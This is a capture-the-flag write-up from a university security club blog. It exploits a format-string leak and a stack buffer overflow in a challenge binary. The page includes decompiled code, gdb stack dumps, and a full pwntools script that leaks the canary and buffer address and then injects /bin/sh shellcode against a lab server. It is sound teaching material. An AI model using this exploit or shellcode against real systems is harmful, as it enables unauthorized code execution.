@@ -1,0 +1,137 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Shell is Love, Shell is life</title><meta content="Shell is Love, Shell is life" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/shell/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Shell is Love, Shell is life" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/shell/ property=twitter:url><meta content="Shell is Love, Shell is life" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/shell/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>shell</span></div><time datetime=2024-09-11>Published on: <span class=accent-data>2024-09-11</span></time><address rel=author>By <span class=accent-data> Abhinav I S, and exploiitm </span></address><h1>Shell is Love, Shell is life</h1><p>As with all pwn challenges, we run checksec on the binary <code>checksec --file=pwn</code><pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span>    </span><span style=color:#fdf4c1>Arch:       amd64-64-little
+</span><span>    </span><span style=color:#fdf4c1>RELRO:      Full RELRO
+</span><span>    </span><span style=color:#fdf4c1>Stack:      Canary found
+</span><span>    </span><span style=color:#fdf4c1>NX:         NX unknown - GNU_STACK missing
+</span><span>    </span><span style=color:#fdf4c1>PIE:        PIE enabled
+</span><span>    </span><span style=color:#fdf4c1>Stack:      Executable
+</span><span>    </span><span style=color:#fdf4c1>RWX:        Has RWX segments
+</span><span>    </span><span style=color:#fdf4c1>SHSTK:      Enabled
+</span><span>    </span><span style=color:#fdf4c1>IBT:        Enabled
+</span><span>    </span><span style=color:#fdf4c1>Stripped:   No
+</span></code></pre><p>NX bit is disabled !, we can execute code on the stack!, let us try disassembling the binary using GHIDRA<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
+</span><span>undefined8 </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> in_FS_OFFSET;
+</span><span>  undefined8 local_78;
+</span><span>  undefined8 local_70;
+</span><span>  undefined8 local_68;
+</span><span>  undefined8 local_60;
+</span><span>  undefined8 local_58;
+</span><span>  undefined8 local_50;
+</span><span>  undefined8 local_48;
+</span><span>  undefined8 local_40;
+</span><span>  undefined8 local_38;
+</span><span>  undefined8 local_30;
+</span><span>  undefined8 local_28;
+</span><span>  undefined8 local_20;
+</span><span>  undefined4 local_18;
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> local_10;
+</span><span>  
+</span><span>  local_10 </span><span style=color:#fe8019>= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>);
+</span><span>  </span><span style=color:#fdf4c1>banner()</span><span>;
+</span><span>  </span><span style=color:#fabd2f>setbuf</span><span style=color:#fdf4c1>(stdout,(</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  local_78 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x333c2049</span><span>;
+</span><span>  local_70 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_68 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_60 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_58 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_50 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_48 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_40 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_38 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_30 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_28 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_20 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  local_18 </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Can you pwn me?"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"What is your name?"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fgets</span><span style=color:#fdf4c1>((</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>local_78,</span><span style=color:#d3869b>100</span><span style=color:#fdf4c1>,stdin)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Welcome to the contingent"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>((</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>local_78)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Anything else?"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fgets</span><span style=color:#fdf4c1>((</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>)</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>local_78,</span><span style=color:#d3869b>0x100</span><span style=color:#fdf4c1>,stdin)</span><span>;
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(local_10 </span><span style=color:#fe8019>!= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>)) {
+</span><span>                    </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
+</span><span>    </span><span style=color:#fdf4c1>__stack_chk_fail()</span><span>;
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
+</span><span>}
+</span></code></pre><p>They are printing user input directly using printf! We can leak information using format string vulnerabilities<p>Let us observe the stack using gdb <code>x/50x $rsp</code><pre style=background:#282828;color:#fdf4c1aa><code><span>0x7fffffffdc90: 0x0000000d      0x00000000      0xffffdca0      0x00007fff
+</span><span>0x7fffffffdca0: 0x6c243725      0x00000a78      0x00000000      0x00000000
+</span><span>0x7fffffffdcb0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcc0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcd0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdce0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcf0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdd00: 0x00000000      0x00000000      0x20220400      0x87f89f7d
+</span><span>0x7fffffffdd10: 0x00000001      0x00000000      0xf7c29d90      0x00007fff
+</span><span>0x7fffffffdd20: 0x00000000      0x00000000      0x55555240      0x00005555
+</span><span>0x7fffffffdd30: 0xffffde10      0x00000001      0xffffde28      0x00007fff
+</span><span>0x7fffffffdd40: 0x00000000      0x00000000      0x66b41503      0xb621f5da
+</span><span>0x7fffffffdd50: 0xffffde28      0x00007fff
+</span></code></pre><p>Strangely, there is an address in the stack, in the stack itself! (0x7fffffffdca0) at 0x7fffffffdc98<p>, Let us try putting AAAA into the first input prompt !<p>examining the stack again,<pre style=background:#282828;color:#fdf4c1aa><code><span>gef➤  x/50x $rsp
+</span><span>0x7fffffffdc90: 0x0000000d      0x00000000      0xffffdca0      0x00007fff
+</span><span>0x7fffffffdca0: 0x0a414141      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcb0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcc0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcd0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdce0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdcf0: 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span>0x7fffffffdd00: 0x00000000      0x00000000      0x67406800      0xa126b205
+</span><span>0x7fffffffdd10: 0x00000001      0x00000000      0xf7c29d90      0x00007fff
+</span><span>0x7fffffffdd20: 0x00000000      0x00000000      0x55555240      0x00005555
+</span><span>0x7fffffffdd30: 0xffffde10      0x00000001      0xffffde28      0x00007fff
+</span><span>0x7fffffffdd40: 0x00000000      0x00000000      0x1dd653c2      0xd568252e
+</span><span>0x7fffffffdd50: 0xffffde28      0x00007fff
+</span></code></pre><p>The address of the buffer is in the stack !, we can leak this address, along with the canary, write shellcode in this buffer, and then over write the return address with the address of the buffer!<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span style=font-style:italic;color:#928374>#exe = ELF("./vuln")
+</span><span>
+</span><span style=font-style:italic;color:#928374>#context.binary = exe
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>conn</span><span>():
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>LOCAL</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process([exe.path])
+</span><span>        </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>DEBUG</span><span>:
+</span><span>            </span><span style=color:#fdf4c1>gdb.attach(r)
+</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"10.21.232.38"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>7003</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>r
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>main</span><span>():
+</span><span>    r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>conn()
+</span><span>    </span><span style=font-style:italic;color:#928374># 22 - > rbp
+</span><span>    </span><span style=font-style:italic;color:#928374># 21 - > canary
+</span><span>    </span><span style=font-style:italic;color:#928374># 7-> location of the array
+</span><span>    payload1 </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"%7$lx.%21$lx"
+</span><span>    </span><span style=color:#fdf4c1>r.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"name?\n"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(payload1)
+</span><span>    </span><span style=color:#fdf4c1>r.recvuntil(</span><span style=color:#b8bb26>"contingent\n"</span><span style=color:#fdf4c1>)
+</span><span>    data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>r.recv().split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\n'</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>0</span><span>]
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(data.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"."</span><span style=color:#fdf4c1>))
+</span><span>    data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>data.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"."</span><span style=color:#fdf4c1>)
+</span><span>    addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(data[</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>],</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
+</span><span>    canary </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(data[</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>],</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>
+</span><span>    shellcode </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#928374>#shellcode is 28 bytes long
+</span><span>
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(shellcode))
+</span><span>    payload2 </span><span style=color:#fe8019>= </span><span>shellcode </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"A"</span><span style=color:#fe8019>*</span><span>(</span><span style=color:#d3869b>104</span><span style=color:#fe8019>-</span><span style=color:#d3869b>48</span><span>)</span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(canary) </span><span style=color:#fe8019>+</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"B"</span><span style=color:#fe8019>*</span><span style=color:#d3869b>8 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(addr)
+</span><span>
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(payload2)
+</span><span>    </span><span style=font-style:italic;color:#928374># good luck pwning :)
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>r.interactive()
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"__main__"</span><span>:
+</span><span>    </span><span style=color:#fdf4c1>main()
+</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
